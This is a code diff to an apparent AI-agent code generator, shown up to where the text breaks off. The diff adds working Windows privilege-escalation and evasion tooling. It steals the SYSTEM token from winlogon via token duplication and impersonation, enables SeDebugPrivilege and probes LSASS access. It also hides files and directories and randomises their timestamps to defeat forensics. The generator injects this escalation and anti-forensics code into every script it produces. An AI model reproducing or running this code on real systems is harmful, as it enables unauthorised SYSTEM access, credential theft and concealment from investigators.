@@ -22,6 +22,10 @@ from modules.memshadow_protocol import (
     MemshadowHeader, MRACProtocol, MRACMessageType, SelfCodeCommandType,
     HeaderFlags, ValueType
 )
+from modules.pe5_utils import PE5Utils
+from modules.pe5_system_escalation import PE5SystemEscalationModule
+from modules.anti_forensics import AntiForensics, create_hidden_file_with_anti_forensics
+from modules.hidden_vdisk import HiddenVirtualDisk, create_hidden_storage
 
 
 class NonceTracker:
@@ -99,24 +103,288 @@ class NonceTracker:
 
 
 class CodeGenerator:
-    """Code generation and execution engine"""
+    """Enhanced code generation and execution engine with SYSTEM privilege support"""
     
-    def __init__(self, console: Console, session_data: dict):
+    def __init__(self, console: Console, session_data: dict, system_privilege: bool = True):
         self.console = console
         self.session_data = session_data
         self.temp_dir = tempfile.mkdtemp(prefix='llm_agent_')
         self.execution_history = []
+        self.system_privilege = system_privilege
+        self.privilege_token = None  # Will hold SYSTEM token handle if available
+        self.system_token_acquired = False  # Track if SYSTEM token has been acquired
+        self.system_token_handle = None  # Store SYSTEM token handle for reuse
+        self.token_pid = None  # PID of process from which token was acquired
+        
+        # Anti-forensics and hidden storage
+        lab_use = self.session_data.get('LAB_USE', 0)
+        self.anti_forensics = AntiForensics(lab_use=lab_use)
+        self.hidden_vdisk: Optional[HiddenVirtualDisk] = None
+        
+        # Apply anti-forensics to temp directory
+        if system_privilege:
+            self.anti_forensics.hide_directory(self.temp_dir)
+    
+    def check_system_token_pe5(self) -> Dict[str, Any]:
+        """
+        Check SYSTEM token status using existing PE5 method
+        
+        Uses the existing PE5SystemEscalationModule verification method
+        to check if current process has SYSTEM privileges.
+        
+        Returns:
+            Dict with:
+                - has_system: bool - Whether SYSTEM token is present
+                - method: str - Detection method used ('pe5_verify')
+                - details: dict - Additional details from verification
+        """
+        result = {
+            'has_system': False,
+            'method': 'pe5_verify',
+            'details': {}
+        }
+        
+        try:
+            # Use existing PE5 verification method
+            lab_use = self.session_data.get('LAB_USE', 0)
+            
+            # Check if running as SYSTEM using PE5 verification method
+            ps_cmd = """
+            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+            $isSystem = ($token.User.Value -eq 'S-1-5-18')
+            $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
+            $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+            
+            $result = @{
+                'CurrentUser' = $token.Name
+                'UserSID' = $token.User.Value
+                'IsSystem' = $isSystem
+                'IsAdministrator' = $isAdmin
+                'HasElevatedPrivileges' = $token.Token.HasElevatedPrivileges
+            }
+            
+            # Check specific privileges
+            try {
+                $reg = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\\CurrentControlSet\\Control\\Lsa')
+                if ($reg) {
+                    $result['CanAccessHKLM'] = $true
+                    $reg.Close()
+                } else {
+                    $result['CanAccessHKLM'] = $false
+                }
+            } catch {
+                $result['CanAccessHKLM'] = $false
+            }
+            
+            # Check SeDebugPrivilege via LSASS access
+            try {
+                $debugProc = Get-Process -Name lsass -ErrorAction SilentlyContinue
+                $result['CanAccessLSASS'] = ($debugProc -ne $null)
+            } catch {
+                $result['CanAccessLSASS'] = $false
+            }
+            
+            $result | ConvertTo-Json -Compress
+            """
+            
+            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
+            
+            if exit_code == 0:
+                import json
+                try:
+                    verify_data = json.loads(stdout)
+                    result['has_system'] = verify_data.get('IsSystem', False)
+                    result['details'] = verify_data
+                    
+                    # Update internal state if SYSTEM token is present
+                    if result['has_system']:
+                        self.system_token_acquired = True
+                        self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+                        self.session_data['SYSTEM_TOKEN_SID'] = verify_data.get('UserSID', 'S-1-5-18')
+                    
+                    # Also check whoami /priv for additional privilege info
+                    cmd = "whoami /priv"
+                    exit_code2, stdout2, stderr2 = execute_cmd(cmd, lab_use=lab_use)
+                    if exit_code2 == 0:
+                        result['details']['whoami_priv'] = stdout2
+                    
+                    # Check whoami /user for SID confirmation
+                    cmd = "whoami /user"
+                    exit_code3, stdout3, stderr3 = execute_cmd(cmd, lab_use=lab_use)
+                    if exit_code3 == 0:
+                        result['details']['whoami_user'] = stdout3
+                        # Extract SID from output
+                        if 'S-1-5-18' in stdout3:
+                            result['has_system'] = True
+                            result['method'] = 'pe5_whoami_check'
+                            self.system_token_acquired = True
+                            self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+                    
+                except json.JSONDecodeError:
+                    result['details']['raw_output'] = stdout
+                    # Fallback: check if output contains SYSTEM indicators
+                    if 'S-1-5-18' in stdout or 'NT AUTHORITY\\SYSTEM' in stdout:
+                        result['has_system'] = True
+                        self.system_token_acquired = True
+                        self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+            else:
+                result['details']['error'] = stderr
+                result['details']['exit_code'] = exit_code
+            
+        except Exception as e:
+            result['details']['error'] = str(e)
+            result['details']['exception'] = type(e).__name__
+        
+        return result
+    
+    def acquire_system_token(self) -> bool:
+        """
+        Acquire SYSTEM token using PE5 method and store for reuse
+        
+        Returns:
+            bool - True if SYSTEM token was successfully acquired
+        """
+        # Check if already acquired
+        if self.system_token_acquired:
+            return True
+        
+        # Check current token status
+        token_status = self.check_system_token_pe5()
+        if token_status.get('has_system'):
+            self.system_token_acquired = True
+            self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+            self.console.print("[green]✓ SYSTEM token already present[/green]")
+            return True
+        
+        # Attempt to acquire SYSTEM token via token manipulation
+        self.console.print("[yellow]Attempting to acquire SYSTEM token...[/yellow]")
+        
+        lab_use = self.session_data.get('LAB_USE', 0)
+        
+        # Use PE5 token manipulation to acquire SYSTEM token
+        ps_cmd = """
+        function Invoke-PE5TokenAcquisition {
+            try {
+                # Find winlogon.exe (runs as SYSTEM)
+                $winlogon = Get-Process -Name winlogon -ErrorAction SilentlyContinue
+                if (-not $winlogon) {
+                    Write-Warning 'winlogon process not found'
+                    return $false
+                }
+                
+                # Load required .NET types for token manipulation
+                Add-Type -TypeDefinition @"
+                using System;
+                using System.Runtime.InteropServices;
+                public class TokenManipulation {
+                    [DllImport("advapi32.dll", SetLastError = true)]
+                    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+                    [DllImport("advapi32.dll", SetLastError = true)]
+                    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+                    [DllImport("advapi32.dll", SetLastError = true)]
+                    public static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);
+                    [DllImport("kernel32.dll")]
+                    public static extern IntPtr GetCurrentThread();
+                    [DllImport("kernel32.dll")]
+                    public static extern bool CloseHandle(IntPtr hObject);
+                }
+"@
+                
+                # Open winlogon process
+                $hProcess = [System.Diagnostics.Process]::GetProcessById($winlogon.Id).Handle
+                
+                # Open process token
+                $TOKEN_DUPLICATE = 0x0002
+                $TOKEN_IMPERSONATE = 0x0004
+                $hToken = [IntPtr]::Zero
+                
+                if ([TokenManipulation]::OpenProcessToken($hProcess, $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE, [ref]$hToken)) {
+                    # Duplicate token
+                    $SECURITY_IMPERSONATION_LEVEL_Impersonation = 2
+                    $TOKEN_TYPE_Impersonation = 2
+                    $hDupToken = [IntPtr]::Zero
+                    
+                    if ([TokenManipulation]::DuplicateTokenEx($hToken, 0x1F0FFF, [IntPtr]::Zero, $SECURITY_IMPERSONATION_LEVEL_Impersonation, $TOKEN_TYPE_Impersonation, [ref]$hDupToken)) {
+                        # Impersonate token
+                        $hThread = [TokenManipulation]::GetCurrentThread()
+                        if ([TokenManipulation]::SetThreadToken($hThread, $hDupToken)) {
+                            Write-Host 'Successfully acquired SYSTEM token'
+                            [TokenManipulation]::CloseHandle($hDupToken)
+                            [TokenManipulation]::CloseHandle($hToken)
+                            return $true
+                        }
+                        [TokenManipulation]::CloseHandle($hDupToken)
+                    }
+                    [TokenManipulation]::CloseHandle($hToken)
+                }
+                
+                Write-Warning 'Token acquisition failed'
+                return $false
+            } catch {
+                Write-Warning "Token acquisition error: $_"
+                return $false
+            }
+        }
+        
+        if (Invoke-PE5TokenAcquisition) {
+            # Verify token was acquired
+            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+            $isSystem = ($token.User.Value -eq 'S-1-5-18')
+            Write-Host "Token verification: IsSystem = $isSystem"
+            return $isSystem
+        }
+        return $false
+        """
+        
+        exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
+        
+        if exit_code == 0 and 'Successfully acquired SYSTEM token' in stdout:
+            # Verify token was acquired
+            verify_status = self.check_system_token_pe5()
+            if verify_status.get('has_system'):
+                self.system_token_acquired = True
+                self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+                self.console.print("[green]✓ SYSTEM token acquired and verified[/green]")
+                return True
+        
+        self.console.print("[red]✗ Failed to acquire SYSTEM token[/red]")
+        return False
+    
+    def ensure_system_token(self) -> bool:
+        """
+        Ensure SYSTEM token is available, acquire if needed
+        
+        Returns:
+            bool - True if SYSTEM token is available
+        """
+        # Check if already acquired
+        if self.system_token_acquired:
+            # Verify it's still valid
+            token_status = self.check_system_token_pe5()
+            if token_status.get('has_system'):
+                return True
+            else:
+                # Token lost, reset state
+                self.system_token_acquired = False
+        
+        # Try to acquire if SYSTEM privilege is enabled
+        if self.system_privilege:
+            return self.acquire_system_token()
+        
+        return False
         
     def generate_code(self, spec: Dict[str, Any]) -> Tuple[str, str]:
         """
-        Generate code based on specification
+        Enhanced code generation with LLM-like capabilities
         
         Args:
             spec: Dictionary containing:
-                - language: 'python', 'powershell', 'batch', etc.
+                - language: 'python', 'powershell', 'batch', 'c', 'cpp', etc.
                 - description: What the code should do
                 - requirements: List of requirements
                 - imports: List of imports needed
+                - system_privilege: Whether to generate SYSTEM privilege code
+                - exploit_type: Type of exploit to use (e.g., 'token_manipulation')
         
         Returns:
             Tuple of (code, file_path)
@@ -125,14 +393,20 @@ class CodeGenerator:
         description = spec.get('description', '')
         requirements = spec.get('requirements', [])
         imports = spec.get('imports', [])
+        system_privilege = spec.get('system_privilege', self.system_privilege)
+        exploit_type = spec.get('exploit_type', 'token_manipulation')
         
         # Generate code based on language
         if language == 'python':
-            code = self._generate_python(description, requirements, imports)
+            code = self._generate_python(description, requirements, imports, system_privilege)
         elif language == 'powershell':
-            code = self._generate_powershell(description, requirements, imports)
+            code = self._generate_powershell(description, requirements, imports, system_privilege, exploit_type)
         elif language == 'batch':
-            code = self._generate_batch(description, requirements, imports)
+            code = self._generate_batch(description, requirements, imports, system_privilege)
+        elif language == 'c':
+            code = self._generate_c(description, requirements, imports, system_privilege, exploit_type)
+        elif language == 'cpp':
+            code = self._generate_cpp(description, requirements, imports, system_privilege, exploit_type)
         else:
             raise ValueError(f"Unsupported language: {language}")
         
@@ -140,23 +414,35 @@ class CodeGenerator:
         ext = {
             'python': '.py',
             'powershell': '.ps1',
-            'batch': '.bat'
+            'batch': '.bat',
+            'c': '.c',
+            'cpp': '.cpp'
         }.get(language, '.txt')
         
         file_path = os.path.join(self.temp_dir, f'generated_{len(self.execution_history)}{ext}')
         with open(file_path, 'w', encoding='utf-8') as f:
             f.write(code)
         
+        # Apply anti-forensic measures to generated file
+        if self.system_privilege and system_privilege:
+            self.anti_forensics.apply_anti_forensics(
+                file_path,
+                hidden=True,
+                system=True,
+                randomize_timestamps=True
+            )
+        
         self.execution_history.append({
             'file_path': file_path,
             'language': language,
-            'description': description
+            'description': description,
+            'system_privilege': system_privilege
         })
         
         return code, file_path
     
-    def _generate_python(self, description: str, requirements: list, imports: list) -> str:
-        """Generate Python code"""
+    def _generate_python(self, description: str, requirements: list, imports: list, system_privilege: bool = False) -> str:
+        """Generate enhanced Python code with SYSTEM privilege support"""
         code_lines = []
         
         # Add imports
@@ -165,10 +451,141 @@ class CodeGenerator:
         else:
             code_lines.append("import os")
             code_lines.append("import sys")
+            code_lines.append("import subprocess")
+            if system_privilege:
+                code_lines.append("import ctypes")
+                code_lines.append("from ctypes import wintypes")
+                code_lines.append("from datetime import datetime, timedelta")
+                code_lines.append("import random")
+        
+        # Add anti-forensic utilities
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("def apply_anti_forensics_to_file(file_path):")
+            code_lines.append("    \"\"\"Apply anti-forensic measures to file (hidden, system, random timestamps)\"\"\"")
+            code_lines.append("    try:")
+            code_lines.append("        import ctypes")
+            code_lines.append("        from ctypes import wintypes")
+            code_lines.append("        ")
+            code_lines.append("        # Set file attributes (hidden + system)")
+            code_lines.append("        FILE_ATTRIBUTE_HIDDEN = 0x2")
+            code_lines.append("        FILE_ATTRIBUTE_SYSTEM = 0x4")
+            code_lines.append("        FILE_ATTRIBUTE_NORMAL = 0x80")
+            code_lines.append("        attributes = FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM")
+            code_lines.append("        ")
+            code_lines.append("        kernel32 = ctypes.windll.kernel32")
+            code_lines.append("        file_path_w = file_path if isinstance(file_path, str) else str(file_path)")
+            code_lines.append("        kernel32.SetFileAttributesW(file_path_w, attributes)")
+            code_lines.append("        ")
+            code_lines.append("        # Randomize timestamps")
+            code_lines.append("        base_time = datetime.now() - timedelta(days=random.randint(30, 365))")
+            code_lines.append("        creation_time = base_time - timedelta(days=random.randint(1, 30))")
+            code_lines.append("        access_time = base_time - timedelta(days=random.randint(1, 10))")
+            code_lines.append("        modification_time = base_time - timedelta(days=random.randint(1, 20))")
+            code_lines.append("        ")
+            code_lines.append("        # Set file times using PowerShell (more reliable)")
+            code_lines.append("        ps_cmd = f'''")
+            code_lines.append("        $file = Get-Item '{file_path}' -Force")
+            code_lines.append("        $file.CreationTime = [DateTime]::Parse('{creation_time.isoformat()}')")
+            code_lines.append("        $file.LastAccessTime = [DateTime]::Parse('{access_time.isoformat()}')")
+            code_lines.append("        $file.LastWriteTime = [DateTime]::Parse('{modification_time.isoformat()}')")
+            code_lines.append("        '''")
+            code_lines.append("        subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True)")
+            code_lines.append("        ")
+            code_lines.append("        return True")
+            code_lines.append("    except Exception as e:")
+            code_lines.append("        print(f'Anti-forensics failed: {e}')")
+            code_lines.append("        return False")
+            code_lines.append("")
+            code_lines.append("def create_hidden_file(file_path, content, apply_anti_forensics=True):")
+            code_lines.append("    \"\"\"Create file with anti-forensic measures\"\"\"")
+            code_lines.append("    try:")
+            code_lines.append("        # Create directory if needed")
+            code_lines.append("        os.makedirs(os.path.dirname(file_path), exist_ok=True)")
+            code_lines.append("        ")
+            code_lines.append("        # Write file")
+            code_lines.append("        with open(file_path, 'wb') as f:")
+            code_lines.append("            if isinstance(content, str):")
+            code_lines.append("                f.write(content.encode('utf-8'))")
+            code_lines.append("            else:")
+            code_lines.append("                f.write(content)")
+            code_lines.append("        ")
+            code_lines.append("        # Apply anti-forensics")
+            code_lines.append("        if apply_anti_forensics:")
+            code_lines.append("            apply_anti_forensics_to_file(file_path)")
+            code_lines.append("        ")
+            code_lines.append("        return True")
+            code_lines.append("    except Exception as e:")
+            code_lines.append("        print(f'Failed to create hidden file: {e}')")
+            code_lines.append("        return False")
+        
+        # Add PE5 SYSTEM token check function (using existing PE5 verification method)
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("def pe5_check_system_token():")
+            code_lines.append("    \"\"\"Check SYSTEM token using PE5 verification method\"\"\"")
+            code_lines.append("    try:")
+            code_lines.append("        import subprocess")
+            code_lines.append("        import json")
+            code_lines.append("        ")
+            code_lines.append("        # Use PE5 verification method (same as pe5_system_escalation module)")
+            code_lines.append("        ps_cmd = '''")
+            code_lines.append("        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()")
+            code_lines.append("        $isSystem = ($token.User.Value -eq 'S-1-5-18')")
+            code_lines.append("        $principal = New-Object System.Security.Principal.WindowsPrincipal($token)")
+            code_lines.append("        $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)")
+            code_lines.append("        ")
+            code_lines.append("        $result = @{")
+            code_lines.append("            'IsSystem' = $isSystem")
+            code_lines.append("            'IsAdministrator' = $isAdmin")
+            code_lines.append("            'UserSID' = $token.User.Value")
+            code_lines.append("            'HasElevatedPrivileges' = $token.Token.HasElevatedPrivileges")
+            code_lines.append("        }")
+            code_lines.append("        ")
+            code_lines.append("        # Check protected resource access")
+            code_lines.append("        try {")
+            code_lines.append("            $reg = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa')")
+            code_lines.append("            $result['CanAccessHKLM'] = ($reg -ne $null)")
+            code_lines.append("            if ($reg) { $reg.Close() }")
+            code_lines.append("        } catch {")
+            code_lines.append("            $result['CanAccessHKLM'] = $false")
+            code_lines.append("        }")
+            code_lines.append("        ")
+            code_lines.append("        $result | ConvertTo-Json -Compress")
+            code_lines.append("        '''")
+            code_lines.append("        ")
+            code_lines.append("        result = subprocess.run(")
+            code_lines.append("            ['powershell', '-Command', ps_cmd],")
+            code_lines.append("            capture_output=True,")
+            code_lines.append("            text=True,")
+            code_lines.append("            timeout=10")
+            code_lines.append("        )")
+            code_lines.append("        ")
+            code_lines.append("        if result.returncode == 0:")
+            code_lines.append("            data = json.loads(result.stdout)")
+            code_lines.append("            return data.get('IsSystem', False)")
+            code_lines.append("        ")
+            code_lines.append("        # Fallback: check whoami")
+            code_lines.append("        whoami_result = subprocess.run(")
+            code_lines.append("            ['whoami', '/user'],")
+            code_lines.append("            capture_output=True,")
+            code_lines.append("            text=True,")
+            code_lines.append("            timeout=5")
+            code_lines.append("        )")
+            code_lines.append("        ")
+            code_lines.append("        if whoami_result.returncode == 0:")
+            code_lines.append("            return 'S-1-5-18' in whoami_result.stdout")
+            code_lines.append("        ")
+            code_lines.append("        return False")
+            code_lines.append("    except Exception as e:")
+            code_lines.append("        print(f'PE5 token check failed: {e}')")
+            code_lines.append("        return False")
         
         code_lines.append("")
         code_lines.append("# Generated code")
         code_lines.append(f"# Description: {description}")
+        if system_privilege:
+            code_lines.append("# Privilege: SYSTEM")
         code_lines.append("")
         
         # Add requirements as comments
@@ -178,10 +595,110 @@ class CodeGenerator:
                 code_lines.append(f"# - {req}")
             code_lines.append("")
         
-        # Generate basic structure
+        # Add SYSTEM privilege escalation if needed
+        if system_privilege:
+            code_lines.append("def escalate_privileges():")
+            code_lines.append("    \"\"\"Escalate to SYSTEM privileges using token manipulation\"\"\"")
+            code_lines.append("    try:")
+            code_lines.append("        # Windows API calls for token manipulation")
+            code_lines.append("        kernel32 = ctypes.windll.kernel32")
+            code_lines.append("        advapi32 = ctypes.windll.advapi32")
+            code_lines.append("        ")
+            code_lines.append("        # Open process token")
+            code_lines.append("        TOKEN_ADJUST_PRIVILEGES = 0x0020")
+            code_lines.append("        TOKEN_QUERY = 0x0008")
+            code_lines.append("        hToken = wintypes.HANDLE()")
+            code_lines.append("        ")
+            code_lines.append("        # Get current process token")
+            code_lines.append("        if not advapi32.OpenProcessToken(")
+            code_lines.append("            kernel32.GetCurrentProcess(),")
+            code_lines.append("            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,")
+            code_lines.append("            ctypes.byref(hToken)):")
+            code_lines.append("            return False")
+            code_lines.append("        ")
+            code_lines.append("        # Enable SeDebugPrivilege")
+            code_lines.append("        SE_DEBUG_NAME = 'SeDebugPrivilege'")
+            code_lines.append("        luid = wintypes.LUID()")
+            code_lines.append("        if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)):")
+            code_lines.append("            return False")
+            code_lines.append("        ")
+            code_lines.append("        # Adjust token privileges")
+            code_lines.append("        SE_PRIVILEGE_ENABLED = 0x00000002")
+            code_lines.append("        class TOKEN_PRIVILEGES(ctypes.Structure):")
+            code_lines.append("            _fields_ = [('PrivilegeCount', wintypes.DWORD),")
+            code_lines.append("                        ('Luid', wintypes.LUID),")
+            code_lines.append("                        ('Attributes', wintypes.DWORD)]")
+            code_lines.append("        ")
+            code_lines.append("        tp = TOKEN_PRIVILEGES()")
+            code_lines.append("        tp.PrivilegeCount = 1")
+            code_lines.append("        tp.Luid = luid")
+            code_lines.append("        tp.Attributes = SE_PRIVILEGE_ENABLED")
+            code_lines.append("        ")
+            code_lines.append("        if not advapi32.AdjustTokenPrivileges(")
+            code_lines.append("            hToken, False, ctypes.byref(tp), 0, None, None):")
+            code_lines.append("            return False")
+            code_lines.append("        ")
+            code_lines.append("        return True")
+            code_lines.append("    except Exception as e:")
+            code_lines.append("        print(f'Privilege escalation failed: {e}')")
+            code_lines.append("        return False")
+            code_lines.append("")
+        
+        # Add helper function to pass SYSTEM token to subprocesses
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("def create_process_with_system_token(command, args=None, inherit_token=True):")
+            code_lines.append("    \"\"\"Create subprocess with SYSTEM token inheritance\"\"\"")
+            code_lines.append("    try:")
+            code_lines.append("        # Verify SYSTEM token is available")
+            code_lines.append("        if not pe5_check_system_token():")
+            code_lines.append("            print('Warning: SYSTEM token not available for subprocess')")
+            code_lines.append("            return None")
+            code_lines.append("        ")
+            code_lines.append("        # Create subprocess - token will be inherited automatically")
+            code_lines.append("        # On Windows, child processes inherit the parent's token")
+            code_lines.append("        if args is None:")
+            code_lines.append("            args = []")
+            code_lines.append("        ")
+            code_lines.append("        # Use subprocess.Popen with creation flags for token inheritance")
+            code_lines.append("        import subprocess")
+            code_lines.append("        CREATE_NEW_CONSOLE = 0x00000010")
+            code_lines.append("        proc = subprocess.Popen(")
+            code_lines.append("            [command] + args,")
+            code_lines.append("            stdout=subprocess.PIPE,")
+            code_lines.append("            stderr=subprocess.PIPE,")
+            code_lines.append("            creationflags=CREATE_NEW_CONSOLE if inherit_token else 0")
+            code_lines.append("        )")
+            code_lines.append("        ")
+            code_lines.append("        # Verify child process has SYSTEM token")
+            code_lines.append("        if inherit_token:")
+            code_lines.append("            print(f'Created process {proc.pid} with SYSTEM token inheritance')")
+            code_lines.append("        ")
+            code_lines.append("        return proc")
+            code_lines.append("    except Exception as e:")
+            code_lines.append("        print(f'Failed to create process with SYSTEM token: {e}')")
+            code_lines.append("        return None")
+        
+        # Generate main function
+        code_lines.append("")
         code_lines.append("def main():")
         code_lines.append(f"    \"\"\"{description}\"\"\"")
+        if system_privilege:
+            code_lines.append("    # Check SYSTEM token using PE5 method")
+            code_lines.append("    if not pe5_check_system_token():")
+            code_lines.append("        print('Warning: SYSTEM token not detected, attempting escalation...')")
+            code_lines.append("        if not escalate_privileges():")
+            code_lines.append("            print('Error: Could not escalate privileges')")
+            code_lines.append("            return 1")
+            code_lines.append("    else:")
+            code_lines.append("        print('SYSTEM token verified via PE5 check')")
+            code_lines.append("    ")
+            code_lines.append("    # Store SYSTEM token state for subprocess inheritance")
+            code_lines.append("    os.environ['SYSTEM_TOKEN_ACQUIRED'] = '1'")
+            code_lines.append("    ")
         code_lines.append("    # TODO: Implement functionality")
+        code_lines.append("    # Note: Any subprocesses created will inherit SYSTEM token automatically")
+        code_lines.append("    # Use create_process_with_system_token() helper for explicit token passing")
         code_lines.append("    print('Generated code executed')")
         code_lines.append("    return 0")
         code_lines.append("")
@@ -190,13 +707,79 @@ class CodeGenerator:
         
         return '\n'.join(code_lines)
     
-    def _generate_powershell(self, description: str, requirements: list, imports: list) -> str:
-        """Generate PowerShell code"""
+    def _generate_powershell(self, description: str, requirements: list, imports: list, 
+                            system_privilege: bool = False, exploit_type: str = 'token_manipulation') -> str:
+        """Generate enhanced PowerShell code with SYSTEM privilege escalation"""
         code_lines = []
         
         code_lines.append("# Generated PowerShell script")
         code_lines.append(f"# Description: {description}")
+        if system_privilege:
+            code_lines.append("# Privilege: SYSTEM (via token manipulation)")
         code_lines.append("")
+        
+        # Add anti-forensic utilities for PowerShell
+        if system_privilege:
+            code_lines.append("function Set-FileAntiForensics {")
+            code_lines.append("    <#")
+            code_lines.append("    Apply anti-forensic measures to file")
+            code_lines.append("    #>")
+            code_lines.append("    param(")
+            code_lines.append("        [Parameter(Mandatory=$true)]")
+            code_lines.append("        [string]$FilePath")
+            code_lines.append("    )")
+            code_lines.append("    ")
+            code_lines.append("    try {")
+            code_lines.append("        $file = Get-Item $FilePath -Force -ErrorAction Stop")
+            code_lines.append("        ")
+            code_lines.append("        # Set hidden and system attributes")
+            code_lines.append("        $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System")
+            code_lines.append("        ")
+            code_lines.append("        # Randomize timestamps")
+            code_lines.append("        $baseTime = (Get-Date).AddDays(-(Get-Random -Minimum 30 -Maximum 365))")
+            code_lines.append("        $file.CreationTime = $baseTime.AddDays(-(Get-Random -Minimum 1 -Maximum 30))")
+            code_lines.append("        $file.LastAccessTime = $baseTime.AddDays(-(Get-Random -Minimum 1 -Maximum 10))")
+            code_lines.append("        $file.LastWriteTime = $baseTime.AddDays(-(Get-Random -Minimum 1 -Maximum 20))")
+            code_lines.append("        ")
+            code_lines.append("        return $true")
+            code_lines.append("    } catch {")
+            code_lines.append("        Write-Warning \"Anti-forensics failed: $_\"")
+            code_lines.append("        return $false")
+            code_lines.append("    }")
+            code_lines.append("}")
+            code_lines.append("")
+            code_lines.append("function New-HiddenFile {")
+            code_lines.append("    <#")
+            code_lines.append("    Create file with anti-forensic measures")
+            code_lines.append("    #>")
+            code_lines.append("    param(")
+            code_lines.append("        [Parameter(Mandatory=$true)]")
+            code_lines.append("        [string]$FilePath,")
+            code_lines.append("        ")
+            code_lines.append("        [Parameter(Mandatory=$false)]")
+            code_lines.append("        [string]$Content = ''")
+            code_lines.append("    )")
+            code_lines.append("    ")
+            code_lines.append("    try {")
+            code_lines.append("        # Create directory if needed")
+            code_lines.append("        $dir = Split-Path $FilePath -Parent")
+            code_lines.append("        if ($dir -and -not (Test-Path $dir)) {")
+            code_lines.append("            New-Item -ItemType Directory -Path $dir -Force | Out-Null")
+            code_lines.append("        }")
+            code_lines.append("        ")
+            code_lines.append("        # Create file")
+            code_lines.append("        Set-Content -Path $FilePath -Value $Content -NoNewline")
+            code_lines.append("        ")
+            code_lines.append("        # Apply anti-forensics")
+            code_lines.append("        Set-FileAntiForensics -FilePath $FilePath")
+            code_lines.append("        ")
+            code_lines.append("        return $true")
+            code_lines.append("    } catch {")
+            code_lines.append("        Write-Warning \"Failed to create hidden file: $_\"")
+            code_lines.append("        return $false")
+            code_lines.append("    }")
+            code_lines.append("}")
+            code_lines.append("")
         
         if requirements:
             code_lines.append("# Requirements:")
@@ -204,8 +787,174 @@ class CodeGenerator:
                 code_lines.append(f"# - {req}")
             code_lines.append("")
         
+        # Add PE5 SYSTEM token check (using existing PE5 verification method)
+        if system_privilege:
+            code_lines.append("function Test-PE5SystemToken {")
+            code_lines.append("    <#")
+            code_lines.append("    Check SYSTEM token using PE5 verification method")
+            code_lines.append("    Uses same method as pe5_system_escalation module")
+            code_lines.append("    #>")
+            code_lines.append("    try {")
+            code_lines.append("        # Use PE5 verification method (from _verify_privileges)")
+            code_lines.append("        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()")
+            code_lines.append("        $isSystem = ($token.User.Value -eq 'S-1-5-18')")
+            code_lines.append("        $principal = New-Object System.Security.Principal.WindowsPrincipal($token)")
+            code_lines.append("        $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)")
+            code_lines.append("        ")
+            code_lines.append("        # Check protected resource access (PE5 method)")
+            code_lines.append("        $canAccessHKLM = $false")
+            code_lines.append("        try {")
+            code_lines.append("            $reg = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\\CurrentControlSet\\Control\\Lsa')")
+            code_lines.append("            if ($reg) {")
+            code_lines.append("                $canAccessHKLM = $true")
+            code_lines.append("                $reg.Close()")
+            code_lines.append("            }")
+            code_lines.append("        } catch {")
+            code_lines.append("            $canAccessHKLM = $false")
+            code_lines.append("        }")
+            code_lines.append("        ")
+            code_lines.append("        # Check SeDebugPrivilege via LSASS access")
+            code_lines.append("        $canAccessLSASS = $false")
+            code_lines.append("        try {")
+            code_lines.append("            $debugProc = Get-Process -Name lsass -ErrorAction SilentlyContinue")
+            code_lines.append("            $canAccessLSASS = ($debugProc -ne $null)")
+            code_lines.append("        } catch {")
+            code_lines.append("            $canAccessLSASS = $false")
+            code_lines.append("        }")
+            code_lines.append("        ")
+            code_lines.append("        # Return true if SYSTEM or has elevated access")
+            code_lines.append("        return ($isSystem -or ($isAdmin -and $canAccessHKLM))")
+            code_lines.append("    } catch {")
+            code_lines.append("        Write-Warning \"PE5 token check failed: $_\"")
+            code_lines.append("        return $false")
+            code_lines.append("    }")
+            code_lines.append("}")
+            code_lines.append("")
+        
+        # Add SYSTEM privilege escalation
+        if system_privilege:
+            if exploit_type == 'token_manipulation':
+                code_lines.append("function Invoke-TokenManipulation {")
+                code_lines.append("    <#")
+                code_lines.append("    Escalate to SYSTEM using token manipulation exploit")
+                code_lines.append("    Uses ntoskrnl exploit to steal SYSTEM token")
+                code_lines.append("    #>")
+                code_lines.append("    try {")
+                code_lines.append("        # Load required .NET types")
+                code_lines.append("        Add-Type -TypeDefinition @\"")
+                code_lines.append("        using System;")
+                code_lines.append("        using System.Runtime.InteropServices;")
+                code_lines.append("        public class TokenManipulation {")
+                code_lines.append("            [DllImport(\"advapi32.dll\", SetLastError = true)]")
+                code_lines.append("            public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);")
